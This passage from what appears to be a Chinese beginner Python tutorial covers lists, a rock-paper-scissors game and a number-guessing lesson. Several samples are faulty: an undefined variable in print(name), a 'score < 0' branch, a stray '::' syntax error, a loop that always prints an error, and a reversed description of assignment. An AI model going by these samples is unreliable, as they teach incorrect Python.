class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-删除元素"><a href="#4-删除元素" class="headerlink" title="4.删除元素"></a>4.删除元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-改变列表中的元素"><a href="#5-改变列表中的元素" class="headerlink" title="5.改变列表中的元素"></a>5.改变列表中的元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'小明'</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6-查找列表中的元素"><a href="#6-查找列表中的元素" class="headerlink" title="6.查找列表中的元素"></a>6.查找列表中的元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'小红'</span><span class="token punctuation">,</span><span class="token string">'小孩'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'小红'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-in和not-in"><a href="#7-in和not-in" class="headerlink" title="7.in和not in"></a>7.in和not in</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>a <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、实现剪刀石头布游戏"><a href="#二、实现剪刀石头布游戏" class="headerlink" title="二、实现剪刀石头布游戏"></a>二、实现剪刀石头布游戏</h2><h3 id="1-计算机"><a href="#1-计算机" class="headerlink" title="1.计算机"></a>1.计算机</h3><p>计算机应该随机选择“剪刀”，“石头”，“布”</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-用户出拳"><a href="#2-用户出拳" class="headerlink" title="2.用户出拳"></a>2.用户出拳</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span>user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请出拳（石头、剪刀、布）：'</span><span class="token punctuation">)</span>  <span class="token comment"># 请用户输入选择</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span class="token keyword">if</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想一想，怎么加入循环，使得用户必须输入正确才能退出循环。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请出拳（石头、剪刀、布）：'</span><span class="token punctuation">)</span>  <span class="token comment"># 请用户输入选择</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一种方法是这样。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请出拳（石头、剪刀、布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为简便用户操作，能不能实现只让用户输入数字呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择（1石头、2剪刀、3布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'石头'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'剪刀'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'布'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断胜负"><a href="#判断胜负" class="headerlink" title="判断胜负"></a>判断胜负</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token comment">#计算机出拳</span>choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span class="token comment">#用户出拳</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择（1石头、2剪刀、3布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'石头'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'剪刀'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'布'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span class="token comment">#判断胜负</span><span class="token keyword">if</span> user_choice <span class="token operator">==</span> computer_choice<span class="token punctuation">:</span>  <span class="token comment"># 使用if进行条件判断</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'平局！'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token punctuation">(</span>user_choice <span class="token operator">==</span> <span class="token string">'石头'</span> <span class="token keyword">and</span> computer_choice <span class="token operator">==</span> <span class="token string">'剪刀'</span><span class="token punctuation">)</span> <span class="token keyword">or</span><span class="token punctuation">(</span>user_choice <span class="token operator">==</span> <span class="token string">'剪刀'</span> <span class="token keyword">and</span> computer_choice <span class="token operator">==</span> <span class="token string">'布'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>user_choice <span class="token operator">==</span> <span class="token string">'布'</span> <span class="token keyword">and</span> computer_choice <span class="token operator">==</span> <span class="token string">'石头'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你赢了！'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输了！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后还可以让代码更简洁一点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token comment">#计算机出拳</span>choice_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'石头'</span><span class="token punctuation">,</span><span class="token string">'剪刀'</span><span class="token punctuation">,</span><span class="token string">'布'</span><span class="token punctuation">]</span>computer_choice <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>choice_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'计算机出拳：'</span><span class="token punctuation">,</span>computer_choice<span class="token punctuation">)</span><span class="token comment">#用户出拳</span>user_choice <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> user_choice <span class="token keyword">not</span> <span class="token keyword">in</span> choice_list<span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择（1石头、2剪刀、3布）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'石头'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'剪刀'</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token string">'布'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新出拳'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户出拳:'</span><span class="token punctuation">,</span>user_choice<span class="token punctuation">)</span><span class="token comment">#判断胜负</span><span class="token keyword">if</span> user_choice <span class="token operator">==</span> computer_choice<span class="token punctuation">:</span>  <span class="token comment"># 使用if进行条件判断</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'平局！'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> user_choice <span class="token operator">==</span> choice_list<span class="token punctuation">[</span>choice_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>computer_choice<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你赢了！'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输了！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法1—猜大小</title>
      <link href="/2022/02/13/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%951%E2%80%94%E7%8C%9C%E5%A4%A7%E5%B0%8F/"/>
      <url>/2022/02/13/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%951%E2%80%94%E7%8C%9C%E5%A4%A7%E5%B0%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-模块的引用"><a href="#1-模块的引用" class="headerlink" title="1.模块的引用"></a>1.模块的引用</h2><h3 id="import-模块名"><a href="#import-模块名" class="headerlink" title="import 模块名"></a>import 模块名</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="import-模块名-as-别名"><a href="#import-模块名-as-别名" class="headerlink" title="import 模块名 as 别名"></a>import 模块名 as 别名</h3><p>另外，还可以给模块名取别名</p><pre class="line-numbers language-none"><code class="language-none">import random as r random_number = r.randint(1, 99)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意，内置库可以直接引用，如果是第三方库需要先安装，安装方法为：win+r，cmd，pip install 模块名。<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><h2 id="2-print-函数"><a href="#2-print-函数" class="headerlink" title="2.print()函数"></a>2.print()函数</h2><p>print (‘’)让程序无需理解，原样输出引号中的内容。 </p><p>print()程序需要读懂括号里的内容。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>random_number<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'random_number'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要换行打印怎么办呢？试一试下面的代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'快乐学习编程'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'每天过得很充实'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'逐渐走向人生巅峰'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''快乐学习编程,每天过得很充实,逐渐走向人生巅峰。'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-转义字符"><a href="#3-转义字符" class="headerlink" title="3.转义字符"></a>3.转义字符</h2><p>转义字符是用来表示不能直接显示的字符，比如换行键、后退键，回车键等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'快乐学习编程,\n每天过得很充实,\n逐渐走向人生巅峰。'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有时候也会遇到一些特殊情况，比如符号重复的问题，如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'I'</span>m student <span class="token keyword">in</span> HaiYan'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>想一想，为什么程序会报错，应该怎么解决。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'I\'m student in HaiYan'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm student in HaiYan"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-赋值语句"><a href="#4-赋值语句" class="headerlink" title="4.赋值语句"></a>4.赋值语句</h2><p>赋值就是把左边的东西装到右边的盒子里。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">my_name<span class="token operator">=</span><span class="token string">'小王'</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>想一想，如果依次将两个东西装进同一个’盒子‘里，会怎么样。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">my_name<span class="token operator">=</span><span class="token string">'小王'</span>my_name<span class="token operator">=</span><span class="token string">'小明'</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>被多次赋值时，变量只会储存最新一次的赋值。<br>Python语言的特色，不需要类型声明，通过赋值语句，就可以定义变量，变量的类型由赋值的结果决定。<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token number">2</span>y <span class="token operator">=</span> <span class="token number">1.0</span>z <span class="token operator">=</span> <span class="token string">'你好世界'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试一试，55，‘55’，55.0的数据类型分别是什么。</p><h2 id="5-input-函数"><a href="#5-input-函数" class="headerlink" title="5.input()函数"></a>5.input()函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">guess_number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的整数:'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>guess_number<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过刚才学习的type()函数，看一下guess_number是什么类型？</p><h2 id="6-字符串拼接"><a href="#6-字符串拼接" class="headerlink" title="6.字符串拼接"></a>6.字符串拼接</h2><p>字符串可以通过+号连接起来。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你的名字：'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你好！'</span><span class="token operator">+</span> name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回到我们的项目中，应该怎么让这个程序更漂亮呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">randomNumber <span class="token operator">=</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统生成的随机数是：'</span> <span class="token operator">+</span> randomNumber<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7-数据类型转换"><a href="#7-数据类型转换" class="headerlink" title="7.数据类型转换"></a>7.数据类型转换</h2><ul><li>str()将其他类型转换为字符串。</li><li>int()将其他类型转换为整型。</li><li>float()将其他类型转换为浮点数<br>注意：只有内容是整数或浮点数的字符串，才可以被强制转换为整数或浮点数。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'你好世界'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>另外，浮点数强制转换为整数时，会直接丢掉小数部分，不是四舍五入。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">6.8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-条件判断语句"><a href="#8-条件判断语句" class="headerlink" title="8.条件判断语句"></a>8.条件判断语句</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">score <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你这次Python考了多少分（0-100）:'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">60</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你及格了'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'唉，得加油了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>思考，上面的程序为什么会报错，应该怎么修改。<br>如果有多个条件怎么办呢？</li></ul><p>第一种方法：用很多个if（不推荐）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">score <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你这次Python考了多少分（0-100）:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不错，很优秀'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">90</span> <span class="token operator">&gt;</span> score <span class="token operator">&gt;=</span> <span class="token number">60</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'还行吧，马马虎虎'</span><span class="token punctuation">)</span><span class="token keyword">if</span> score <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'唉，得加油了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二种方式：（推荐）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">score <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你这次Python考了多少分（0-100）:'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不错，很优秀'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> score <span class="token operator">&gt;=</span> <span class="token number">60</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'还行吧，马马虎虎'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'唉，得加油了'</span><span class="token punctuation">)</span><span aria-hidden="true" 